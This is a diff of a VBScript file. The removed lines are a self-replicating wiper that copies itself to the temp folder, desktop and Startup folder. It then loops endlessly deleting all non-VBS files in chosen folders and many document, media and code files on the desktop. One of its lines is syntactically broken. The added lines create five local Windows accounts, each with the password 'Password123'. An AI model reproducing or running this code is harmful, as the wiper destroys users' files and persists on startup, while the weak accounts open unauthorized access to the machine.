@@ -1,69 +1,10 @@
-Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-strScriptPath = WScript.ScriptFullName
+Set objNetwork = CreateObject("WScript.Network")
+strComputerName = objNetwork.ComputerName
 
-' Specify the folders in which you want to delete files (modify as needed)
-foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")
-
-' Get the path to the desktop folder
-strDesktopFolder = objShell.SpecialFolders("Desktop")
-
-' Specify the number of copies to create
-numCopies = 999
-
-' Generate copies of the script
-For i = 1 To numCopies
-    randomIteration = Int((1000 * Rnd) + 1)
-
-    strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
-
-    ' Create a copy of the script on the desktop
-    strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
+Set objComputer = GetObject("WinNT://" & strComputerName)
+For i = 1 To 5
+    strUsername = "User" & i
+    Set objUser = objComputer.Create("user", strUsername)
+    objUser.SetPassword "Password123"
+    objUser.SetInfo
 Next
-
-' Add the script to the startup folder
-startupFolder = objShell.SpecialFolders("Startup")
-objFSO.CopyFile strScriptPath, startupFolder & "\Copy.vbs", True ' Add "True" to overwrite existing files
-
-' Loop indefinitely
-Do
-    ' Delete all files except VBS files within the specified folders
-    For Each folderPath In foldersToDelete
-        DeleteFilesExceptVBS folderPath
-    Next
-
-    ' Loop through each file in the Desktop folder and delete if it has a specified file extension
-    For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
-        Dim desktopExtension
-        desktopExtension = LCase(objFSO.GetExtensionName(objFile.Name))
-        If desktopExtension = "txt" Or desktopExtension = "exe" Or desktopExtension = "json" Or desktopExtension = "doc" Or desktopExtension = "pdf" Or desktopExtension = "wpd" Or desktopExtension = "docx" Or desktopExtension = "rtf" Or desktopExtension = "tex" Or desktopExtension = "odt" Or desktopExtension = "jpg" Or desktopExtension = "jpeg" Or desktopExtension = "mp3" Or desktopExtension = "rar" Or desktopExtension = "vcd" Or desktopExtension = "webp" Or desktopExtension = "css" Or desktopExtension = "html" Or desktopExtension = "py" Or desktopExtension = "php" Or desktopExtension = "ico" Or desktopExtension = "lnk" Or desktopExtension = "mp4" Or desktopExtension = "js" Or desktopExtension = "bak" Or desktopExtension = "xml" Or desktopExtension = "zip" Or desktopExtension = "bmp" Then
-            objFSO.DeleteFile(objFile)
-        End If
-    Next
-
-Loop
-
-Sub DeleteFilesExceptVBS(folderPath)
-    On Error Resume Next
-    
-    Set folder = objFSO.GetFolder(folderPath)
-    If Set folder = objFSO.GetFolder(folderPath)
-    If Err.Number = 0 Then
-        For Each file In folder.Files
-            Dim extension
-            extension = LCase(objFSO.GetExtensionName(file.Name))
-            If extension <> "vbs" Then
-                objFSO.DeleteFile(file.Path)
-            End If
-        Next
-        
-        ' Recursively delete files in subfolders
-        For Each subfolder In folder.Subfolders
-            DeleteFilesExceptVBS subfolder.Path
-        Next
-    End If
-    
-    On Error GoTo 0
-End Sub
